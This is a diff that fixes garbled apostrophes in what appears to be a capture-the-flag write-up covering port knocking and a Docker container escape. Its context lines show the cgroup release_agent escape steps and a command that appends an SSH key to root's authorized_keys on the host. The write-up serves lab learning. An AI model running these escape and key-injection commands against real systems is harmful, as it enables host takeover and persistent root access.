@@ -62,7 +62,7 @@ Taylor: Adore who?
 Josh: Adore is between you and I so please open up!
 ```
 
-As we can see, there is a hint on `port knocking`, port knocking is a stealthy method used to open closed ports on a firewall by sending a specific sequence of connection attempts (knocks) to predefined ports. These ports appear closed from the outside, but when the correct sequence is received, the firewall temporarily opens a port (e.g., SSH) for the client. Itâ€™s like a secret handshake, only those who know the right knock pattern can get in. This technique adds an extra layer of obscurity and is often used to hide services from unauthorized users.
+As we can see, there is a hint on `port knocking`, port knocking is a stealthy method used to open closed ports on a firewall by sending a specific sequence of connection attempts (knocks) to predefined ports. These ports appear closed from the outside, but when the correct sequence is received, the firewall temporarily opens a port (e.g., SSH) for the client. It's like a secret handshake, only those who know the right knock pattern can get in. This technique adds an extra layer of obscurity and is often used to hide services from unauthorized users.
 
 To visualize more info on port knocking, refer to:
 
@@ -403,7 +403,7 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-This PoC works by exploiting cgroupâ€™s`release_agent` feature.
+This PoC works by exploiting cgroup's`release_agent` feature.
 
 After the last process in a cgroup exits, a command used to remove abandoned cgroups runs. This command is specified in the`release_agent` file and it runs as root on the host machine. By default, this feature is disabled and the`release_agent` path is empty.
 
@@ -426,7 +426,7 @@ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
 
-We can then start writing to our command file. This script will execute the`ps aux` command and save it to the`/output` file. We also need to set the scriptâ€™s execute permission bits:
+We can then start writing to our command file. This script will execute the`ps aux` command and save it to the`/output` file. We also need to set the script's execute permission bits:
 
 ```
 echo '#!/bin/sh' > /cmd
@@ -440,7 +440,7 @@ Finally, trigger the attack by spawning a process that immediately ends inside t
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-You can use the PoC to execute arbitrary commands on the host system. For example, you can use it to write your SSH key to the root userâ€™s`authorized_keys` file:
+You can use the PoC to execute arbitrary commands on the host system. For example, you can use it to write your SSH key to the root user's`authorized_keys` file:
 
 ```
 cat id_rsa.pub >> /root/.ssh/authorized_keys
